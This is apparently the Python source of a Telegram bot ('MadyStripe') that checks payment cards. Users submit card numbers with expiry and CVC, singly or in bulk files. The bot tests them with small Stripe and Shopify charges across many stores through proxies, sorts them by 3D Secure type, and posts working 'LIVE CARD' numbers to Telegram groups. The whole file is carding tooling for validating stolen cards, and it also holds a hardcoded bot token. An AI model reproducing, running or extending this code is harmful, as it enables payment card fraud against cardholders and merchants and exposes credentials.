"""
Telegram Bot Interface - Remote card checking via Telegram
Based on mady_final.py with enhancements
"""

import os
import sys
import time
import threading
from typing import Dict, Optional

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

try:
    import telebot
except ImportError:
    print("Error: python-telegram-bot-api not installed")
    print("Install with: pip install pyTelegramBotAPI")
    sys.exit(1)

from core.checker import CardChecker, load_cards_from_file, validate_card_format
from core.gateways import get_gateway_manager
from core.shopify_simple_gateway import SimpleShopifyGateway


class TelegramBotInterface:
    """Telegram bot interface for MadyStripe"""
    
    def __init__(self, bot_token: str, group_ids: list, bot_credit: str = "@MissNullMe"):
        """
        Initialize Telegram bot
        
        Args:
            bot_token: Telegram bot token
            group_ids: List of group IDs to post approved cards
            bot_credit: Bot credit text
        """
        self.bot = telebot.TeleBot(bot_token)
        self.group_ids = group_ids
        self.bot_credit = bot_credit
        self.gateway_manager = get_gateway_manager()
        
        # User preferences
        self.user_gateways: Dict[str, str] = {}
        self.user_stop_flags: Dict[str, bool] = {}
        self.active_checkers: Dict[str, CardChecker] = {}
        self.user_proxies: Dict[str, Optional[str]] = {}  # User-specific proxies
        self.global_proxy: Optional[str] = None  # Global proxy for all users
        
        # Register handlers
        self._register_handlers()
        
        # Set bot commands for menu
        self._set_bot_commands()
    
    def _set_bot_commands(self):
        """Set bot commands for Telegram menu (shows when user types /)"""
        try:
            from telebot import types
            
            commands = [
                types.BotCommand("start", "🚀 Start the bot"),
                types.BotCommand("help", "📖 Show help message"),
                types.BotCommand("str", "💳 Check with $1 Stripe (Pipeline)"),
                types.BotCommand("penny", "🪙 Check with $0.01 Shopify gate"),
                types.BotCommand("low", "💵 Check with $5 Shopify gate"),
                types.BotCommand("medium", "💰 Check with $20 Shopify gate"),
                types.BotCommand("high", "💎 Check with $100 Shopify gate"),
                types.BotCommand("gate", "🔧 Select gateway"),
                types.BotCommand("check", "📁 Check cards from file"),
                types.BotCommand("stop", "🛑 Stop current check"),
                types.BotCommand("stats", "📊 View statistics"),
                types.BotCommand("setproxy", "🔒 Set proxy"),
                types.BotCommand("checkproxy", "🔍 Test proxy connection"),
            ]
            
            self.bot.set_my_commands(commands)
            print("✅ Bot commands menu set successfully")
        except Exception as e:
            print(f"⚠️  Could not set bot commands: {e}")
    
    def _register_handlers(self):
        """Register all bot command handlers"""
        
        @self.bot.message_handler(commands=['start'])
        def start_handler(message):
            self._handle_start(message)
        
        @self.bot.message_handler(commands=['gate', 'gateway'])
        def gate_handler(message):
            self._handle_gate(message)
        
        @self.bot.message_handler(commands=['check'])
        def check_handler(message):
            self._handle_check_command(message)
        
        @self.bot.message_handler(commands=['stop'])
        def stop_handler(message):
            self._handle_stop(message)
        
        @self.bot.message_handler(commands=['stats'])
        def stats_handler(message):
            self._handle_stats(message)
        
        @self.bot.message_handler(commands=['help'])
        def help_handler(message):
            self._handle_help(message)
        
        @self.bot.message_handler(commands=['setproxy'])
        def setproxy_handler(message):
            self._handle_setproxy(message)
        
        @self.bot.message_handler(commands=['checkproxy'])
        def checkproxy_handler(message):
            self._handle_checkproxy(message)
        
        # STRIPE GATE - $1 CC Foundation
        @self.bot.message_handler(commands=['str', 'stripe'])
        def stripe_handler(message):
            self._handle_pipeline_check(message)
        
        # SHOPIFY GATES
        @self.bot.message_handler(commands=['penny', 'cent'])
        def penny_handler(message):
            self._handle_shopify_check(message, 'penny')
        
        @self.bot.message_handler(commands=['low'])
        def low_handler(message):
            self._handle_shopify_check(message, 'low')
        
        @self.bot.message_handler(commands=['medium'])
        def medium_handler(message):
            self._handle_shopify_check(message, 'medium')
        
        @self.bot.message_handler(commands=['high'])
        def high_handler(message):
            self._handle_shopify_check(message, 'high')
        
        @self.bot.message_handler(content_types=['document'])
        def document_handler(message):
            self._handle_document(message)
        
        @self.bot.message_handler(func=lambda m: '|' in m.text)
        def card_handler(message):
            self._handle_single_card(message)
    
    def _handle_start(self, message):
        """Handle /start command"""
        gateways_text = "\n".join([
            f"{i+1}. {g['name']} - {g['charge']}"
            for i, g in enumerate(self.gateway_manager.list_gateways()[:5])
        ])
        
        text = f"""
🤖 <b>Welcome to MadyStripe Unified v3.0!</b>

<b>🎯 Gateway Commands:</b>
/str or /stripe - $1 Stripe (Pipeline)
/penny or /cent - $0.01 Shopify (Dynamic)
/low - $5 Shopify (Dynamic)
/medium - $20 Shopify (Dynamic)
/high - $100 Shopify (Dynamic)

<b>📋 Other Commands:</b>
/check <i>filepath</i> - Check cards from file
/gate - Select gateway
/stop - Stop current check
/stats - View gateway statistics
/setproxy - Set proxy for requests
/checkproxy - Check current proxy status
/help - Show detailed help

<b>📝 Usage:</b>
• Send card: <code>4532123456789012|12|25|123</code>
• Check file: <code>/check /path/to/cards.txt</code>
• Upload .txt file directly

<b>✨ Features:</b>
• Multiple advanced gateways
• STRICT result detection (no false positives)
• Live card type detection (2D/3D/3DS)
• Real-time progress updates
• Auto-posting to groups

<b>Bot by:</b> {self.bot_credit}
"""
        self.bot.send_message(message.chat.id, text, parse_mode='HTML')
    
    def _handle_gate(self, message):
        """Handle gateway selection"""
        user_id = str(message.from_user.id)
        
        gateways = self.gateway_manager.list_gateways()
        
        text = "<b>🔧 Select Gateway:</b>\n\n"
        for i, gate in enumerate(gateways, 1):
            text += f"{i}. <b>{gate['name']}</b>\n"
            text += f"   💰 {gate['charge']} | ⚡ {gate['speed']}\n"
            text += f"   📊 Success: {gate['success_rate']:.1f}%\n\n"
        
        text += "Reply with number:"
        
        msg = self.bot.send_message(message.chat.id, text, parse_mode='HTML')
        self.bot.register_next_step_handler(msg, self._process_gate_selection)
    
    def _process_gate_selection(self, message):
        """Process gateway selection"""
        user_id = str(message.from_user.id)
        choice = message.text.strip()
        
        gateways = self.gateway_manager.list_gateways()
        
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(gateways):
                gate_id = gateways[idx]['id']
                self.user_gateways[user_id] = gate_id
                self.bot.reply_to(
                    message,
                    f"✅ Gateway set to: <b>{gateways[idx]['name']}</b>",
                    parse_mode='HTML'
                )
            else:
                self.bot.reply_to(message, "❌ Invalid selection")
        except:
            self.bot.reply_to(message, "❌ Invalid selection")
    
    def _handle_check_command(self, message):
        """Handle /check command"""
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            self.bot.reply_to(message, "❌ Usage: /check /path/to/file.txt")
            return
        
        file_path = parts[1].strip()
        if not os.path.exists(file_path):
            self.bot.reply_to(message, f"❌ File not found: {file_path}")
            return
        
        self._process_file(message, file_path)
    
    def _handle_stop(self, message):
        """Handle /stop command"""
        user_id = str(message.from_user.id)
        
        if user_id in self.active_checkers:
            self.active_checkers[user_id].stop()
            self.bot.reply_to(message, "🛑 Stopping current check...")
        else:
            self.bot.reply_to(message, "ℹ️ No active check to stop")
    
    def _handle_stats(self, message):
        """Handle /stats command"""
        stats = self.gateway_manager.get_stats()
        
        if not stats:
            self.bot.reply_to(message, "ℹ️ No statistics available yet")
            return
        
        text = "<b>📊 Gateway Statistics:</b>\n\n"
        
        for gateway_name, gate_stats in stats.items():
            text += f"<b>{gateway_name}</b>\n"
            text += f"  ✅ Success: {gate_stats['success']}\n"
            text += f"  ❌ Failed: {gate_stats['failed']}\n"
            text += f"  ⚠️ Errors: {gate_stats['errors']}\n"
            text += f"  📈 Rate: {gate_stats['success_rate']:.1f}%\n\n"
        
        self.bot.send_message(message.chat.id, text, parse_mode='HTML')
    
    def _handle_help(self, message):
        """Handle /help command"""
        text = """
<b>📖 MadyStripe Help</b>

<b>🎯 Gateway Commands:</b>

<b>/str</b> or <b>/stripe</b> - $1 Stripe (Pipeline)
<b>/penny</b> or <b>/cent</b> - $0.01 Shopify (Dynamic)
<b>/low</b> - $5 Shopify (Dynamic)
<b>/medium</b> - $20 Shopify (Dynamic)
<b>/high</b> - $100 Shopify (Dynamic)

<b>📋 Other Commands:</b>

<b>/start</b> - Show welcome message
<b>/gate</b> - Select which gateway to use
<b>/check</b> <i>filepath</i> - Check cards from file
<b>/stop</b> - Stop current checking process
<b>/stats</b> - View gateway statistics
<b>/setproxy</b> - Set proxy for your requests
<b>/checkproxy</b> - Check current proxy status
<b>/help</b> - Show this help message

<b>🔒 Proxy Commands:</b>

<b>/setproxy</b> <i>proxy</i> - Set your proxy
Example: <code>/setproxy http://user:pass@host:port</code>

<b>/setproxy clear</b> - Remove your proxy

<b>/checkproxy</b> - Check if proxy is working

<b>📝 Card Format:</b>
<code>CARD_NUMBER|MM|YY|CVC</code>

Example:
<code>4532123456789012|12|25|123</code>

<b>📁 File Checking:</b>
1. Upload a .txt file with cards (one per line)
2. Or use: <code>/check /path/to/file.txt</code>

<b>🎨 Card Types:</b>
🔓 2D - No authentication
🔐 3D - 3D Secure v1
🛡️ 3DS - 3D Secure v2

<b>✅ Results:</b>
• ONLY approved cards → Posted to groups
• Declined/Error cards → Shown only to you
• Progress updates every 10 cards

<b>⚡ Tips:</b>
• Use /str for fastest checks ($1 Stripe)
• Files limited to 200 cards
• 2.5s delay between checks
• STRICT detection: No false positives!
"""
        self.bot.send_message(message.chat.id, text, parse_mode='HTML')
    
    def _handle_document(self, message):
        """Handle uploaded document"""
        if not message.document.file_name.endswith('.txt'):
            self.bot.reply_to(message, "❌ Please upload a .txt file")
            return
        
        try:
            file_info = self.bot.get_file(message.document.file_id)
            downloaded_file = self.bot.download_file(file_info.file_path)
            
            temp_file = f"/tmp/{message.from_user.id}_cards.txt"
            with open(temp_file, 'wb') as f:
                f.write(downloaded_file)
            
            self._process_file(message, temp_file)
            
            # Clean up
            try:
                os.remove(temp_file)
            except:
                pass
                
        except Exception as e:
            self.bot.reply_to(message, f"❌ Error: {str(e)}")
    
    def _handle_single_card(self, message):
        """Handle single card check"""
        user_id = str(message.from_user.id)
        card = message.text.strip()
        
        # Validate card
        is_valid, error = validate_card_format(card)
        if not is_valid:
            self.bot.reply_to(message, f"❌ {error}\n\nUse format: NUMBER|MM|YY|CVC")
            return
        
        # Get gateway
        gateway_id = self.user_gateways.get(user_id)
        gateway = self.gateway_manager.get_gateway(gateway_id)
        
        if not gateway:
            gateway = self.gateway_manager.get_default_gateway()
        
        self.bot.reply_to(message, f"⏳ Checking with {gateway.name}...")
        
        # Get user's proxy
        user_id = str(message.from_user.id)
        proxy = self._get_user_proxy(user_id)
        
        # Check card
        checker = CardChecker(gateway_id=gateway_id, rate_limit=0, proxy=proxy)
        result = checker.check_single(card)
        
        # Send result to user
        self._send_card_result(message, result, to_user=True)
        
        # Post to groups if approved
        if result.is_live():
            self._post_to_groups(message, result)
    
    def _process_file(self, message, file_path: str):
        """Process a file of cards"""
        user_id = str(message.from_user.id)
        
        # Load cards
        try:
            valid_cards, invalid_cards = load_cards_from_file(file_path, limit=200)
        except Exception as e:
            self.bot.reply_to(message, f"❌ Error loading file: {e}")
            return
        
        if not valid_cards:
            self.bot.reply_to(message, "❌ No valid cards found in file")
            return
        
        if invalid_cards:
            self.bot.send_message(
                message.chat.id,
                f"⚠️ Skipped {len(invalid_cards)} invalid cards"
            )
        
        # Get gateway
        gateway_id = self.user_gateways.get(user_id)
        gateway = self.gateway_manager.get_gateway(gateway_id)
        
        if not gateway:
            gateway = self.gateway_manager.get_default_gateway()
        
        # Send status message
        status_msg = self.bot.reply_to(message, f"""
⏳ <b>Starting Check...</b>

<b>File:</b> {os.path.basename(file_path)}
<b>Cards:</b> {len(valid_cards)}
<b>Gateway:</b> {gateway.name}

<i>Processing...</i>
""", parse_mode='HTML')
        
        # Get user's proxy
        proxy = self._get_user_proxy(user_id)
        
        # Create checker
        checker = CardChecker(gateway_id=gateway_id, rate_limit=2.5, proxy=proxy)
        checker.stats.total = len(valid_cards)
        self.active_checkers[user_id] = checker
        
        # Progress callback
        def on_result(result):
            # Post approved cards to groups
            if result.is_live():
                self._post_to_groups(message, result)
        
        checker.add_callback(on_result)
        
        # Check cards in thread
        def check_thread():
            try:
                for i, card in enumerate(valid_cards, 1):
                    if checker.stop_flag:
                        break
                    
                    result = checker.check_single(card)
                    
                    # Update progress every 10 cards
                    if i % 10 == 0 or i == len(valid_cards):
                        try:
                            stats = checker.stats
                            self.bot.edit_message_text(f"""
⏳ <b>Progress: {i}/{len(valid_cards)}</b>

✅ Approved: {stats.approved}
🔐 CVV: {stats.cvv_mismatch}
💰 Insufficient: {stats.insufficient_funds}
❌ Declined: {stats.declined}
⚠️ Errors: {stats.errors}

⚡ Speed: {stats.get_speed():.2f} c/s
""", message.chat.id, status_msg.message_id, parse_mode='HTML')
                        except:
                            pass
                    
                    time.sleep(2.5)
                
                # Final summary
                stats = checker.stats
                self.bot.edit_message_text(f"""
🎉 <b>Complete!</b>

<b>Total:</b> {len(valid_cards)} cards
<b>Gateway:</b> {gateway.name}

✅ Approved: {stats.approved}
🔐 CVV Mismatch: {stats.cvv_mismatch}
💰 Insufficient: {stats.insufficient_funds}
❌ Declined: {stats.declined}
⚠️ Errors: {stats.errors}

<b>Success Rate:</b> {stats.get_success_rate():.1f}%
<b>Live Rate:</b> {stats.get_live_rate():.1f}%
<b>Speed:</b> {stats.get_speed():.2f} c/s
""", message.chat.id, status_msg.message_id, parse_mode='HTML')
                
            except Exception as e:
                self.bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
            finally:
                if user_id in self.active_checkers:
                    del self.active_checkers[user_id]
        
        thread = threading.Thread(target=check_thread, daemon=True)
        thread.start()
    
    def _send_card_result(self, message, result, to_user: bool = True):
        """Send card result to user"""
        type_emoji = "🔓" if result.card_type == "2D" else "🔐" if result.card_type == "3D" else "🛡️"
        
        if result.is_approved():
            text = f"""
✅ <b>APPROVED!</b>

<b>Card:</b> <code>{result.card}</code>
<b>Gateway:</b> {result.gateway}
<b>Response:</b> {result.message}
<b>Card Type:</b> {type_emoji} <b>{result.card_type}</b>
"""
        elif result.status == 'error':
            text = f"""
⚠️ <b>ERROR</b>

<b>Card:</b> <code>{result.card}</code>
<b>Gateway:</b> {result.gateway}
<b>Error:</b> {result.message}
"""
        else:
            text = f"""
❌ <b>DECLINED</b>

<b>Card:</b> <code>{result.card}</code>
<b>Gateway:</b> {result.gateway}
<b>Reason:</b> {result.message}
"""
        
        if to_user:
            self.bot.send_message(message.chat.id, text, parse_mode='HTML')
    
    def _handle_pipeline_check(self, message):
        """Handle Pipeline/Stripe gateway check"""
        from core.pipeline_gateway import PipelineGateway
        
        parts = message.text.split(maxsplit=1)
        
        if len(parts) < 2:
            self.bot.reply_to(
                message,
                "❌ Usage: /str CARD|MM|YY|CVV\n\n"
                "Example: /str 4532123456789012|12|25|123\n\n"
                "This will check with $1 Stripe (Pipeline) gate"
            )
            return
        
        card = parts[1].strip()
        
        # Validate card
        is_valid, error = validate_card_format(card)
        if not is_valid:
            self.bot.reply_to(message, f"❌ {error}\n\nUse format: NUMBER|MM|YY|CVC")
            return
        
        gateway = PipelineGateway()
        
        self.bot.reply_to(message, f"⏳ Checking with {gateway.name}...")
        
        # Check card
        status, msg, card_type = gateway.check(card)
        
        # Create result object
        class Result:
            def __init__(self, card, status, message, card_type, gateway_name):
                self.card = card
                self.status = status
                self.message = message
                self.card_type = card_type
                self.gateway = gateway_name
            
            def is_live(self):
                # STRICT: Only approved status is live
                return self.status == 'approved'
            
            def is_approved(self):
                return self.status == 'approved'
        
        result = Result(card, status, msg, card_type, gateway.name)
        
        # Send result to user
        self._send_card_result(message, result, to_user=True)
        
        # Post to groups if live
        if result.is_live():
            self._post_to_groups(message, result)
    
    def _handle_shopify_check(self, message, gate_type: str):
        """Handle Shopify price gate commands using SimpleShopifyGateway"""
        parts = message.text.split(maxsplit=1)
        
        if len(parts) < 2:
            gate_names = {
                'penny': 'Shopify (Any Price)',
                'low': 'Shopify (Any Price)',
                'medium': 'Shopify (Any Price)',
                'high': 'Shopify (Any Price)'
            }
            self.bot.reply_to(
                message,
                f"❌ Usage: /{gate_type} CARD|MM|YY|CVV\n\n"
                f"Example: /{gate_type} 4532123456789012|12|25|123\n\n"
                f"This will check with {gate_names[gate_type]} gate\n"
                f"(Automatically finds cheapest product from 11,419 stores)"
            )
            return
        
        card = parts[1].strip()
        
        # Validate card
        is_valid, error = validate_card_format(card)
        if not is_valid:
            self.bot.reply_to(message, f"❌ {error}\n\nUse format: NUMBER|MM|YY|CVC")
            return
        
        # Use SimpleShopifyGateway for all Shopify commands
        # It automatically finds stores and products
        gateway = SimpleShopifyGateway()
        
        self.bot.reply_to(message, f"⏳ Checking with {gateway.name}...\n(Trying up to 5 stores)")
        
        # Check card with max 5 store attempts
        status, msg, card_type = gateway.check(card, max_attempts=5)
        
        # Create result object
        class Result:
            def __init__(self, card, status, message, card_type, gateway_name):
                self.card = card
                self.status = status
                self.message = message
                self.card_type = card_type
                self.gateway = gateway_name
            
            def is_live(self):
                # STRICT: Only approved status is live
                return self.status == 'approved'
            
            def is_approved(self):
                return self.status == 'approved'
        
        result = Result(card, status, msg, card_type, gateway.name)
        
        # Send result to user
        self._send_card_result(message, result, to_user=True)
        
        # Post to groups if live
        if result.is_live():
            self._post_to_groups(message, result)
    
    def _handle_setproxy(self, message):
        """Handle /setproxy command"""
        from core.proxy_parser import ProxyParser
        
        user_id = str(message.from_user.id)
        parts = message.text.split(maxsplit=1)
        
        if len(parts) < 2:
            current_proxy = self.user_proxies.get(user_id) or self.global_proxy
            
            if current_proxy:
                text = f"""
🔒 <b>Current Proxy:</b>

<code>{current_proxy}</code>

<b>Usage:</b>
/setproxy <i>proxy</i> - Set new proxy
/setproxy clear - Remove proxy
/checkproxy - Test proxy connection

<b>Supported Formats:</b>
<code>http://user:pass@host:port</code>
<code>user:pass@host:port</code>
<code>host:port:user:pass</code>
<code>host:port</code>
"""
            else:
                text = """
🔒 <b>No Proxy Set</b>

<b>Usage:</b>
/setproxy <i>proxy</i>

<b>Supported Formats:</b>
1. <code>http://user:pass@host:port</code>
2. <code>user:pass@host:port</code>
3. <code>host:port:user:pass</code>
4. <code>host:port</code>

<b>Examples:</b>
<code>/setproxy http://user:pass@proxy.com:8080</code>
<code>/setproxy user:pass@proxy.com:8080</code>
<code>/setproxy proxy.com:8080:user:pass</code>

<b>To remove:</b>
<code>/setproxy clear</code>
"""
            
            self.bot.send_message(message.chat.id, text, parse_mode='HTML')
            return
        
        proxy_input = parts[1].strip()
        
        # Clear proxy
        if proxy_input.lower() == 'clear':
            if user_id in self.user_proxies:
                del self.user_proxies[user_id]
            self.bot.reply_to(message, "✅ Proxy cleared!")
            return
        
        # Parse proxy using ProxyParser
        parsed_proxy = ProxyParser.parse(proxy_input)
        
        if not parsed_proxy:
            self.bot.reply_to(
                message,
                "❌ Invalid proxy format!\n\n"
                "<b>Supported formats:</b>\n"
                "• <code>http://user:pass@host:port</code>\n"
                "• <code>user:pass@host:port</code>\n"
                "• <code>host:port:user:pass</code>\n"
                "• <code>host:port</code>\n\n"
                "<b>Examples:</b>\n"
                "• <code>proxy.com:8080:myuser:mypass</code>\n"
                "• <code>user:pass@proxy.com:8080</code>",
                parse_mode='HTML'
            )
            return
        
        # Set proxy (store in standard format)
        self.user_proxies[user_id] = parsed_proxy
        
        self.bot.reply_to(
            message,
            f"✅ Proxy set successfully!\n\n"
            f"<b>Original:</b> <code>{proxy_input}</code>\n"
            f"<b>Parsed:</b> <code>{parsed_proxy}</code>\n\n"
            f"Use /checkproxy to test connection",
            parse_mode='HTML'
        )
    
    def _handle_checkproxy(self, message):
        """Handle /checkproxy command"""
        user_id = str(message.from_user.id)
        
        # Get user's proxy or global proxy
        proxy = self.user_proxies.get(user_id) or self.global_proxy
        
        if not proxy:
            self.bot.reply_to(
                message,
                "❌ No proxy configured!\n\n"
                "Use /setproxy to set a proxy"
            )
            return
        
        # Send testing message
        test_msg = self.bot.reply_to(
            message,
            f"🔄 Testing proxy...\n\n<code>{proxy}</code>",
            parse_mode='HTML'
        )
        
        # Test proxy
        import requests
        
        try:
            # Parse proxy
            proxies = {
                'http': proxy,
                'https': proxy
            }
            
            # Test with httpbin
            response = requests.get(
                'https://httpbin.org/ip',
                proxies=proxies,
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                ip = data.get('origin', 'Unknown')
                
                self.bot.edit_message_text(
                    f"✅ <b>Proxy Working!</b>\n\n"
                    f"<b>Proxy:</b> <code>{proxy}</code>\n"
                    f"<b>IP:</b> <code>{ip}</code>\n"
                    f"<b>Status:</b> Connected\n\n"
                    f"Your requests will use this proxy.",
                    message.chat.id,
                    test_msg.message_id,
                    parse_mode='HTML'
                )
            else:
                self.bot.edit_message_text(
                    f"⚠️ <b>Proxy Issue</b>\n\n"
                    f"<b>Proxy:</b> <code>{proxy}</code>\n"
                    f"<b>Status Code:</b> {response.status_code}\n\n"
                    f"Proxy may not be working correctly.",
                    message.chat.id,
                    test_msg.message_id,
                    parse_mode='HTML'
                )
        
        except requests.exceptions.ProxyError:
            self.bot.edit_message_text(
                f"❌ <b>Proxy Connection Failed</b>\n\n"
                f"<b>Proxy:</b> <code>{proxy}</code>\n"
                f"<b>Error:</b> Cannot connect to proxy\n\n"
                f"Check proxy address and credentials.",
                message.chat.id,
                test_msg.message_id,
                parse_mode='HTML'
            )
        
        except requests.exceptions.Timeout:
            self.bot.edit_message_text(
                f"⏱️ <b>Proxy Timeout</b>\n\n"
                f"<b>Proxy:</b> <code>{proxy}</code>\n"
                f"<b>Error:</b> Connection timeout\n\n"
                f"Proxy is too slow or not responding.",
                message.chat.id,
                test_msg.message_id,
                parse_mode='HTML'
            )
        
        except Exception as e:
            self.bot.edit_message_text(
                f"❌ <b>Proxy Test Failed</b>\n\n"
                f"<b>Proxy:</b> <code>{proxy}</code>\n"
                f"<b>Error:</b> {str(e)[:100]}\n\n"
                f"Check proxy configuration.",
                message.chat.id,
                test_msg.message_id,
                parse_mode='HTML'
            )
    
    def _get_user_proxy(self, user_id: str) -> Optional[str]:
        """Get proxy for user"""
        return self.user_proxies.get(user_id) or self.global_proxy
    
    def _post_to_groups(self, message, result):
        """Post approved card to groups"""
        type_emoji = "🔓" if result.card_type == "2D" else "🔐" if result.card_type == "3D" else "🛡️"
        
        username = message.from_user.username or "User"
        
        text = f"""
✅ <b>LIVE CARD</b> ✅

<b>Card:</b> <code>{result.card}</code>
<b>Gateway:</b> {result.gateway}
<b>Response:</b> {result.message}
<b>Card Type:</b> {type_emoji} <b>{result.card_type}</b>

<b>By:</b> @{username}
<b>Bot:</b> {self.bot_credit}
"""
        
        for group_id in self.group_ids:
            try:
                self.bot.send_message(group_id, text, parse_mode='HTML')
            except Exception as e:
                print(f"Error posting to group {group_id}: {e}")
    
    def run(self):
        """Start the bot"""
        print("="*60)
        print("🤖 MadyStripe Telegram Bot Starting...")
        print(f"Groups: {', '.join(self.group_ids)}")
        print(f"Gateways: {len(self.gateway_manager.list_gateways())}")
        print("="*60)
        
        while True:
            try:
                self.bot.infinity_polling(timeout=20, long_polling_timeout=10)
            except Exception as e:
                print(f"Error: {e}")
                time.sleep(5)


def run_telegram_bot(bot_token: str, group_ids: list, bot_credit: str = "@MissNullMe"):
    """
    Run the Telegram bot
    
    Args:
        bot_token: Telegram bot token
        group_ids: List of group IDs
        bot_credit: Bot credit text
    """
    bot = TelegramBotInterface(bot_token, group_ids, bot_credit)
    bot.run()


if __name__ == '__main__':
    # Configuration
    BOT_TOKEN = "8598833492:AAHpOq3lB51htnWV_c2zfKkP8zxCrc9cw4M"
    GROUP_IDS = ["-1003538559040"]
    BOT_CREDIT = "@MissNullMe"
    
    run_telegram_bot(BOT_TOKEN, GROUP_IDS, BOT_CREDIT)
